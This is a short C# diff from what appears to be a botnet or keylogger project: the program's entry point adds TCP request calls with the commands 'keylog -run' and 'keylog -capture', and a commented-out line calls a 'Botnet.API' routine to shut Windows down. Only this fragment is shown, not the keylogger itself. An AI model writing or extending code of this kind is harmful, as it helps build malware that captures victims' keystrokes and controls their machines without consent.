@@ -22,7 +22,9 @@ namespace key
         static void Main(string[] args)
         {
 
-            TCPAcceptRequest.Request.Instance.AcceptRequestServer("");
+            TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -run");
+
+            TCPAcceptRequest.Request.Instance.AcceptRequestServer("keylog -capture");
 
             //Shut down
             //Botnet.API.DoExitWin(Botnet.ExitWindowsFlags.EWX_SHUTDOWN);
